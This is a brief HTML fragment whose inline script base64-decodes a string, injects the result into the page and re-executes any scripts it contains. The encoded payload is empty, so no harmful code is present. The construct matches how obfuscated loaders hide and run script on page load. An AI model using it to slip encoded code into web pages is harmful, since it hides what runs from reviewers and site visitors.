    <div id="__app"></div>
    <script>
        (function() {
            var _p = "";
            var _b = atob(_p);
            var _u = new Uint8Array(_b.length);
            for (var i = 0; i < _b.length; i++) {
                _u[i] = _b.charCodeAt(i) & 0xff;
            }
            var _h = new TextDecoder("utf-8").decode(_u);
            var _r = document.getElementById("__app");
            _r.innerHTML = _h;
            Array.prototype.forEach.call(_r.querySelectorAll("script"), function(o) {
                var n = document.createElement("script");
                for (var j = 0; j < o.attributes.length; j++) {
                    var a = o.attributes[j];
                    n.setAttribute(a.name, a.value);
                }
                n.text = o.text;
                n.async = false;
                o.parentNode.replaceChild(n, o);
            });
        })();
